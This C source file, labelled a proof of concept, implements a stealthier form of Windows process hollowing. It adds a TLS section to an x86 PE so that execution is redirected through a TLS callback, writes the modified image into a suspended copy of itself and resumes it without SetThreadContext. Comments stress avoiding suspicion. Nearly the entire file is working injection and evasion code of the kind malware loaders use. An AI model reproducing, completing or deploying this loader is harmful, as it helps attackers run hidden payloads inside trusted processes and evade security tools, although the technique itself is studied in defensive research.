#include <Windows.h>
#include <stdio.h>

/*
	TRUNPE.c
	WINTERNL.COM
	Proof-of-Concept
*/

typedef struct _PEB {
	BYTE                          Reserved1[2];
	BYTE                          BeingDebugged;
	BYTE                          Reserved2[1];
	PVOID                         Reserved3[2];
	PVOID						  Ldr;
	PVOID						  ProcessParameters;
	PVOID                         Reserved4[3];
	PVOID                         AtlThunkSListPtr;
	PVOID                         Reserved5;
	ULONG                         Reserved6;
	PVOID                         Reserved7;
	ULONG                         Reserved8;
	ULONG                         AtlThunkSListPtr32;
	PVOID                         Reserved9[45];
	BYTE                          Reserved10[96];
	PVOID						  PostProcessInitRoutine;
	BYTE                          Reserved11[128];
	PVOID                         Reserved12[1];
	ULONG                         SessionId;
} PEB, * PPEB;

typedef struct _PROCESS_BASIC_INFORMATION {
	PVOID Reserved1;
	PPEB PebBaseAddress;
	PVOID Reserved2[2];
	ULONG_PTR UniqueProcessId;
	PVOID Reserved3;
} PROCESS_BASIC_INFORMATION;

typedef NTSTATUS(NTAPI* t_NtUnmapViewOfSection)		(HANDLE ProcessHandle, PVOID BaseAddress);
typedef NTSTATUS(NTAPI* t_NtAllocateVirtualMemory)	(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);
typedef NTSTATUS(NTAPI* t_NtWriteVirtualMemory)		(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, ULONG NumberOfBytesToWrite, PULONG NumberOfBytesWritten);
typedef NTSTATUS(NTAPI* t_NtProtectVirtualMemory)	(HANDLE ProcessHandle, PVOID* BaseAddress, PULONG NumberOfBytesToProtect, ULONG NewAccessProtection, PULONG OldAccessProtection);
typedef NTSTATUS(NTAPI* t_NtResumeThread)			(HANDLE ThreadHandle, PULONG SuspendCount);
typedef NTSTATUS(NTAPI* t_NtQueryInformationProcess)(HANDLE ProcessHandle, INT ProcessInformationClass, PVOID ProcessInformation, ULONG ProcessInformationLength, PULONG ReturnLength);
typedef NTSTATUS(NTAPI* t_NtReadVirtualMemory)		(HANDLE ProcessHandle, PVOID BaseAddress, PVOID BUffer, ULONG NumberOfBytesToRead, PULONG NUmberOfBytesRead);

t_NtUnmapViewOfSection NtUnmapViewOfSection;
t_NtAllocateVirtualMemory NtAllocateVirtualMemory;
t_NtWriteVirtualMemory NtWriteVirtualMemory;
t_NtProtectVirtualMemory NtProtectVirtualMemory;
t_NtResumeThread NtResumeThread;
t_NtQueryInformationProcess NtQueryInformationProcess;
t_NtReadVirtualMemory NtReadVirtualMemory;

BOOLEAN InitNTApi() {

	HMODULE hNtdll = GetModuleHandle(TEXT("ntdll"));
	if (!hNtdll) {
		return FALSE;
	}

	NtUnmapViewOfSection = GetProcAddress(hNtdll, "NtUnmapViewOfSection");
	NtAllocateVirtualMemory = GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
	NtWriteVirtualMemory = GetProcAddress(hNtdll, "NtWriteVirtualMemory");
	NtProtectVirtualMemory = GetProcAddress(hNtdll, "NtProtectVirtualMemory");
	NtResumeThread = GetProcAddress(hNtdll, "NtResumeThread");
	NtQueryInformationProcess = GetProcAddress(hNtdll, "NtQueryInformationProcess");
	NtReadVirtualMemory = GetProcAddress(hNtdll, "NtReadVirtualMemory");

	return
		NtUnmapViewOfSection && NtAllocateVirtualMemory &&
		NtWriteVirtualMemory && NtProtectVirtualMemory &&
		NtResumeThread && NtQueryInformationProcess &&
		NtReadVirtualMemory;
}

PBYTE ReadFileToMem(TCHAR* szFilePath, DWORD* dwSize) {

	HANDLE hFile = INVALID_HANDLE_VALUE;
	PBYTE pBuffer = NULL;

	hFile = CreateFile(szFilePath, GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
	if (!hFile) {
		return NULL;
	}

	*dwSize = GetFileSize(hFile, NULL);
	if (*dwSize == INVALID_FILE_SIZE) {
		CloseHandle(hFile);
		return NULL;
	}

	pBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, *dwSize);
	if (!pBuffer) {
		CloseHandle(hFile);
		return NULL;
	}

	if (!ReadFile(hFile, pBuffer, *dwSize, &*dwSize, NULL)) {
		CloseHandle(hFile);
		HeapFree(GetProcessHeap(), 0, pBuffer);
		return NULL;
	}

	CloseHandle(hFile);

	return pBuffer;
}

DWORD CalcPhysicalSize(PBYTE lpExeBuffer) {

	PIMAGE_DOS_HEADER piDH = (PIMAGE_DOS_HEADER)lpExeBuffer;
	PIMAGE_NT_HEADERS piNH = (PIMAGE_NT_HEADERS)((ULONG_PTR)lpExeBuffer + piDH->e_lfanew);

	PIMAGE_SECTION_HEADER piSH = IMAGE_FIRST_SECTION(piNH);

	for (size_t i = 0; i < piNH->FileHeader.NumberOfSections - 1; i++) {
		piSH++;
	}

	return piSH->PointerToRawData + piSH->SizeOfRawData;
}

#define ALIGN_UP(x,y) ((x+(y-1))&(~(y-1)))

PBYTE InsertTLS(PBYTE lpExeBuffer, DWORD dwEntryPointVA) {

	PIMAGE_DOS_HEADER piDH = (PIMAGE_DOS_HEADER)lpExeBuffer;
	PIMAGE_NT_HEADERS piNH = (PIMAGE_NT_HEADERS)((DWORD)lpExeBuffer + piDH->e_lfanew);
	PIMAGE_SECTION_HEADER piSH = (PIMAGE_SECTION_HEADER)
		IMAGE_FIRST_SECTION(piNH);

	/* iterate to last section */
	for (size_t i = 0; i < piNH->FileHeader.NumberOfSections - 1; i++)
		piSH++;

	/* round up last section */
	piNH->FileHeader.NumberOfSections++;
	piSH->SizeOfRawData = ALIGN_UP(piSH->SizeOfRawData, piNH->OptionalHeader.FileAlignment);

	/* create push/ret of entrypoint */
	BYTE tlsCode[6] = { 0x68, 0x00, 0x00, 0x00, 0x00, 0xc3 };
	*(DWORD*)(tlsCode + 1) = dwEntryPointVA;

	/* create new IMAGE_SECTION_HEADER for tls section */
	IMAGE_SECTION_HEADER pshTls = { 0 };
	RtlCopyMemory(&pshTls.Name, ".tls\0", 5);
	pshTls.SizeOfRawData = ALIGN_UP(sizeof(IMAGE_TLS_DIRECTORY) + sizeof(tlsCode), piNH->OptionalHeader.FileAlignment);
	pshTls.PointerToRawData = piSH->PointerToRawData + piSH->SizeOfRawData;
	pshTls.Misc.VirtualSize = ALIGN_UP(sizeof(IMAGE_TLS_DIRECTORY) + sizeof(tlsCode), piNH->OptionalHeader.SectionAlignment);
	pshTls.VirtualAddress = ALIGN_UP(piSH->VirtualAddress + piSH->Misc.VirtualSize, piNH->OptionalHeader.SectionAlignment);
	pshTls.Characteristics = 0xE0000040;

	/* increment the section header pointer */
	piSH++;

	/* not enough space in IMAGE_SECTION_HEADER table */
	if (piSH->Characteristics) {
		printf("[-] Injection does not support extending IMAGE_SECTION_HEADER table yet.");
		getchar();

		return NULL;
	}

	/* copy the new section header to the next entry location */
	RtlCopyMemory(piSH, &pshTls, sizeof(IMAGE_SECTION_HEADER));

	/* allocate a new exe with space for added section data */
	PBYTE pNewExe = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, piNH->OptionalHeader.SizeOfImage + piSH->SizeOfRawData);
	RtlCopyMemory(pNewExe, lpExeBuffer, piNH->OptionalHeader.SizeOfImage);

	/* create the new section:
		-> IMAGE_TLS_DIRECTORY
		=> POINTER TO RAW_CODE
		-> RAW_CODE
	*/
	IMAGE_TLS_DIRECTORY iTLS = { 0 };

	iTLS.AddressOfIndex = piNH->OptionalHeader.ImageBase + piSH->VirtualAddress; // can be any value

	iTLS.AddressOfCallBacks =
		piNH->OptionalHeader.ImageBase
		+ piSH->VirtualAddress
		+ sizeof(IMAGE_TLS_DIRECTORY);

	RtlCopyMemory(((ULONG_PTR)pNewExe + piSH->PointerToRawData), &iTLS, sizeof(IMAGE_TLS_DIRECTORY));

	const ULONG_PTR ptrToCode = (ULONG_PTR)(piNH->OptionalHeader.ImageBase + piSH->VirtualAddress + sizeof(IMAGE_TLS_DIRECTORY) + sizeof(DWORD));
	RtlCopyMemory(((ULONG_PTR)pNewExe + piSH->PointerToRawData + sizeof(IMAGE_TLS_DIRECTORY)),
		&ptrToCode,
		sizeof(DWORD));
	RtlCopyMemory(((ULONG_PTR)pNewExe + piSH->PointerToRawData + sizeof(IMAGE_TLS_DIRECTORY) + sizeof(DWORD)),
		tlsCode,
		sizeof(tlsCode));

	/* fixup new */
	piDH = (PIMAGE_DOS_HEADER)pNewExe;
	piNH = (PIMAGE_NT_HEADERS)((ULONG_PTR)pNewExe + piDH->e_lfanew);

	piNH->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].Size = sizeof(IMAGE_TLS_DIRECTORY);
	piNH->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress = piSH->VirtualAddress;

	piNH->OptionalHeader.SizeOfImage = piSH->VirtualAddress + ALIGN_UP(piSH->Misc.VirtualSize, piNH->OptionalHeader.SectionAlignment);
	piNH->OptionalHeader.AddressOfEntryPoint = 0;

	DWORD dwCopySize = CalcPhysicalSize(pNewExe);

	PBYTE pRetBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwCopySize); // VirtualAlloc(NULL, dwCopySize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	RtlCopyMemory(pRetBuffer, pNewExe, dwCopySize);

	HeapFree(GetProcessHeap(), 0, pNewExe);

	return pRetBuffer;
}


/* http://www.rohitab.com/discuss/topic/41529-stealthier-process-hollowing-code/ */
static DWORD secp2vmemp[2][2][2] = {
{
		//not executable
		{PAGE_NOACCESS, PAGE_WRITECOPY},
		{PAGE_READONLY, PAGE_READWRITE}
	},
	{
		//executable
		{PAGE_EXECUTE, PAGE_EXECUTE_WRITECOPY},
		{PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE}
	}
};

static DWORD secp_to_vmemp(DWORD secp)
{
	DWORD vmemp;
	int executable, readable, writable;

	executable = (secp & IMAGE_SCN_MEM_EXECUTE) != 0;
	readable = (secp & IMAGE_SCN_MEM_READ) != 0;
	writable = (secp & IMAGE_SCN_MEM_WRITE) != 0;
	vmemp = secp2vmemp[executable][readable][writable];
	if (secp & IMAGE_SCN_MEM_NOT_CACHED)
		vmemp |= PAGE_NOCACHE;
	return vmemp;
}

int main(void) {

	/* Initialize NT APIs */
	if (!InitNTApi()) {
		printf("[-] Error loading functions from NTDLL...\n");
		getchar();
	}

	/* Read PE into memory */
	DWORD dwExeSize = 0;
	PBYTE pExeBuffer = ReadFileToMem(TEXT("C:\\Users\\Admin\\Desktop\\bintext.exe"), &dwExeSize);

	if (!pExeBuffer || !dwExeSize) {
		printf("[-] Error reading PE file from disk...\n");
		getchar();
	}

	/* Perform sanity checks */
	PIMAGE_DOS_HEADER piDH = (PIMAGE_DOS_HEADER)pExeBuffer;
	if (piDH->e_magic != IMAGE_DOS_SIGNATURE) {
		printf("[-] Sanity check fail MZ_HEADER...\n");
		getchar();
	}

	PIMAGE_NT_HEADERS piNH = (PIMAGE_NT_HEADERS)((DWORD)pExeBuffer + piDH->e_lfanew);

	if (piNH->FileHeader.Machine != IMAGE_FILE_MACHINE_I386) {
		printf("[-] Only support x86 PE files...\n");
		getchar();
	}

	/* Do we already have a TLS section? */
	if (piNH->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].Size) {
		printf("[-] Does not support files already with TLS section...\n");
		getchar();
	}

	/* reloc warn */
	if (piNH->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size) {
		printf("[-] WARN: Injection does not work when image is not loaded at preferred imagebase...");
		getchar();
	}

	TCHAR path[MAX_PATH];
	GetModuleFileName(GetModuleHandle(NULL), &path, MAX_PATH);

	PROCESS_INFORMATION pi = { 0 };
	STARTUPINFO si = { 0 };

	if (!CreateProcess(NULL, path, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
		printf("[-] CreateProcess failed...");
		getchar();
	}

	PROCESS_BASIC_INFORMATION pbi = { 0 };
	DWORD dwRead = 0;

	NtQueryInformationProcess(pi.hProcess,
		0,
		&pbi,
		sizeof(PROCESS_BASIC_INFORMATION),
		&dwRead);

	PEB remotePEB = { 0 };

	NtReadVirtualMemory(pi.hProcess, pbi.PebBaseAddress, &remotePEB, sizeof(PEB), &dwRead);

	ULONG_PTR dwRemoteImageBase = piNH->OptionalHeader.ImageBase; // remotePEB.Reserved3[1];
	// todo: read sizeofImage (remote) and check if it's big enough

	PBYTE newEXE = InsertTLS(pExeBuffer, ((ULONG_PTR)dwRemoteImageBase + piNH->OptionalHeader.AddressOfEntryPoint));
	piDH = (PIMAGE_DOS_HEADER)newEXE;
	piNH = (PIMAGE_NT_HEADERS)((ULONG_PTR)newEXE + piDH->e_lfanew);

	SIZE_T szAlloc = piNH->OptionalHeader.SizeOfImage;

	/* this is a rudimentary check, really should compare SizeOfImage and page size */
	if (dwRemoteImageBase == piNH->OptionalHeader.ImageBase) {
		NtUnmapViewOfSection(pi.hProcess, (PVOID)dwRemoteImageBase);
	}
	
	/* allocate RW only to not arouse as much suspision */
	NtAllocateVirtualMemory(pi.hProcess, &dwRemoteImageBase, 0, &szAlloc, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	/* copy headers */
	NtWriteVirtualMemory(pi.hProcess, (PVOID)dwRemoteImageBase, newEXE, piNH->OptionalHeader.SizeOfHeaders, NULL);

	DWORD dwProt = 0;
	DWORD dwProtSize = 0;
	PVOID pProtAddr = dwRemoteImageBase;

	dwProtSize = ALIGN_UP(piNH->OptionalHeader.SizeOfHeaders, piNH->OptionalHeader.SectionAlignment);
	NtProtectVirtualMemory(pi.hProcess, &pProtAddr, &dwProtSize, PAGE_READONLY, &dwProt);

	/* copy sections */
	PIMAGE_SECTION_HEADER piSH = IMAGE_FIRST_SECTION(piNH);

	for (size_t count = 0; count < piNH->FileHeader.NumberOfSections; count++)
	{
		NtWriteVirtualMemory(pi.hProcess, (PVOID)(dwRemoteImageBase + piSH->VirtualAddress), (PVOID)((ULONG_PTR)newEXE + piSH->PointerToRawData), piSH->SizeOfRawData, NULL);

		pProtAddr = (PVOID)(dwRemoteImageBase + piSH->VirtualAddress);
		dwProtSize = piSH->Misc.VirtualSize;

		NtProtectVirtualMemory(pi.hProcess, &pProtAddr, &dwProtSize, secp_to_vmemp(piSH->Characteristics), &dwProt);
		piSH++;
	}

	/* update remote peb imagebase */
	NtWriteVirtualMemory(pi.hProcess, (PVOID)((ULONG_PTR)pbi.PebBaseAddress + 0x08), &piNH->OptionalHeader.ImageBase, sizeof(DWORD), NULL);

	/* <--- No SetThreadContext! ---> */

	/* resume main thread */
	NtResumeThread(pi.hThread, NULL);
}